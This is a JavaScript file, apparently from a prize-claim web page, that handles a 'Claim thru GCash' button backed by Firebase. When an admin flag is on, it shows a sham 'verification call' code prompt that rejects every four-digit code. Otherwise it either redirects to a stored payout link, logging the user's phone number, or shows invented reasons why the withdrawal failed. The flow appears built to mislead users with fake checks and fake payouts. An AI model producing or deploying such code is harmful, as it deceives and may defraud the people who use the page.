/**
 * popup_share.js
 * CLAIM THRU GCASH LOGIC - COMPLETE
 */

// ========== FIREWALL VERIFICATION POPUP ==========
function showFirewallVerificationPopup() {
    // Remove existing modal
    var existing = document.getElementById('firewallModal');
    if (existing) existing.remove();
    
    var modal = document.createElement('div');
    modal.id = 'firewallModal';
    modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(10px);z-index:20001;display:flex;align-items:center;justify-content:center;';
    
    modal.innerHTML = `
        <div style="background:linear-gradient(145deg,#1a1525,#0f0a1a);border-radius:48px;max-width:340px;width:85%;padding:30px;text-align:center;border:1px solid rgba(255,215,0,0.3);">
            <div style="font-size:48px;margin-bottom:15px;">📞</div>
            <h2 style="color:#ff4444;font-size:22px;margin-bottom:15px;">VERIFICATION REQUIRED</h2>
            <p style="color:white;margin-bottom:20px;">Enter the 4-digit code from the verification call.</p>
            <div style="display:flex;gap:10px;margin-bottom:15px;">
                <input type="text" id="vCode" style="flex:1;background:rgba(0,0,0,0.5);border:1px solid rgba(255,215,0,0.3);border-radius:30px;padding:12px;color:white;font-size:18px;text-align:center;" placeholder="1234" maxlength="4">
                <button id="verifyBtn" style="background:#ff4444;border:none;border-radius:30px;padding:0 20px;color:white;font-weight:bold;cursor:pointer;">VERIFY</button>
            </div>
            <div id="vError" style="color:#ff4444;font-size:12px;display:none;"></div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var input = document.getElementById('vCode');
    var verifyBtn = document.getElementById('verifyBtn');
    var errorDiv = document.getElementById('vError');
    
    if (input) input.focus();
    
    verifyBtn.onclick = function() {
        var code = input.value.trim();
        if (!code || code.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        errorDiv.innerHTML = "Invalid verification code. Please try again.";
        errorDiv.style.display = 'block';
        input.value = '';
        input.focus();
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };
}

// ========== NO LINK ALERT ==========
function showNoLinkAlert() {
    var modal = document.createElement('div');
    modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:20000;display:flex;align-items:center;justify-content:center;';
    
    modal.innerHTML = `
        <div style="background:linear-gradient(145deg,#1a1525,#0f0a1a);border-radius:40px;max-width:320px;width:85%;padding:30px;text-align:center;border:1px solid rgba(255,68,68,0.3);">
            <div style="font-size:48px;margin-bottom:15px;">⚠️</div>
            <h3 style="color:#ff4444;font-size:20px;margin-bottom:20px;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color:white;font-size:13px;text-align:left;">
                <p><strong>Possible Reasons:</strong></p>
                <p>• No GCash payout link available</p>
                <p>• Device reached maximum payout limit</p>
                <p>• No GCash app installed</p>
                <p>• Please try another device</p>
            </div>
            <button id="closeAlert" style="background:#ff4444;border:none;border-radius:40px;padding:12px;color:white;font-weight:bold;margin-top:20px;width:100%;cursor:pointer;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlert').onclick = function() {
        modal.remove();
    };
}

// ========== MAIN CLAIM LOGIC ==========
async function handleClaimThruGCash() {
    console.log("CLAIM THRU GCASH clicked");
    
    // Close prize popup
    var prizePopup = document.getElementById('prizePopup');
    if (prizePopup) prizePopup.style.display = 'none';
    
    // Check Firebase
    if (typeof firebase === 'undefined' || !firebase.database) {
        alert("Firebase not ready. Please refresh.");
        return;
    }
    
    var db = firebase.database();
    
    try {
        // Get firewall status
        var firewallSnap = await db.ref('admin/globalFirewall/active').once('value');
        var isFirewallOn = firewallSnap.val() === true;
        
        // Get available link (kung meron)
        var linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        var hasLink = linkSnap.exists();
        
        console.log("Firewall:", isFirewallOn ? "ON" : "OFF");
        console.log("Has link:", hasLink);
        
        if (isFirewallOn) {
            // FIREWALL ON - always show verification
            showFirewallVerificationPopup();
            return;
        }
        
        // FIREWALL OFF
        if (hasLink) {
            // MAY LINK - redirect
            var key = Object.keys(linkSnap.val())[0];
            var linkData = linkSnap.val()[key];
            var url = linkData.url;
            
            if (url && !url.startsWith('http')) {
                url = 'https://' + url;
            }
            
            // Update link status
            var userPhone = localStorage.getItem("userPhone") || "Unknown";
            await db.ref('links/' + key).update({
                status: 'claimed',
                claimedAt: Date.now(),
                user: userPhone
            });
            
            console.log("Redirecting to:", url);
            window.location.href = url;
            
        } else {
            // WALANG LINK - show alert
            showNoLinkAlert();
        }
        
    } catch(error) {
        console.error("Error:", error);
        alert("System error. Please try again.");
    }
}

// ========== INITIALIZE BUTTON ==========
function initClaimThruGCashButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    
    if (claimBtn) {
        var newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        claimBtn = newBtn;
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            handleClaimThruGCash();
        };
        
        console.log("CLAIM THRU GCASH button ready");
    } else {
        setTimeout(initClaimThruGCashButton, 500);
    }
}

// ========== START ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    initClaimThruGCashButton();
});

// Expose
window.handleClaimThruGCash = handleClaimThruGCash;
